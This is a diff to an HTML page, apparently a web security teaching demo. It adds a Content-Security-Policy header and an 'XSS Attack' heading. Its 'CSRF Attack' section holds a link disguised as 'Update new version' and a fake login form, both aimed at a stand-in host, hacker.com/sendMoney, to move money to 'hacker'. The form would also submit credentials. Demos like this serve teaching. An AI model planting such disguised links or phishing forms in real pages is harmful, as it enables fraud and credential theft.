@@ -5,14 +5,21 @@
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Security-Policy" content="script-src 'self' ; object-src 'self';
+    base-uri 'none'; style-src 'self'">
     <title>Web Security</title>
     <link rel="stylesheet" href="style.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Raleway:wght@100;400;600;800;900&display=swap"
+        rel="stylesheet">
     <script src="app.js" defer></script>
 
 </head>
 
 <body>
     <section id="user-input">
+        <h1>XSS Attack</h1>
         <form>
             <div class="form-control">
                 <label for="user-message">Your Message</label>
@@ -27,6 +34,27 @@
     </section>
     <section id="user-messages">
         <ul></ul>
+    </section>
+    <section id="user-input">
+        <h1>CSRF Attack</h1>
+        <a class="csrf-attack" href="http://hacker.com/sendMoney?from='Anbarasan'&to='hacker'&amount=100000"
+            target="_self">
+            Update new version
+        </a>
+
+        <form action="http://hacker.com/sendMoney?from='Anbarasan'&to='hacker'&amount=100000" method="POST">
+            <div class="form-control">
+                <label for="message-image">Username</label>
+                <input type="text" id="message-image" name="message-image" />
+            </div>
+            <div class="form-control">
+                <label for="message-image">Password</label>
+                <input type="text" id="message-image" name="message-image" />
+            </div>
+            <button type="submit">Login</button>
+
+        </form>
+
     </section>
 </body>
 
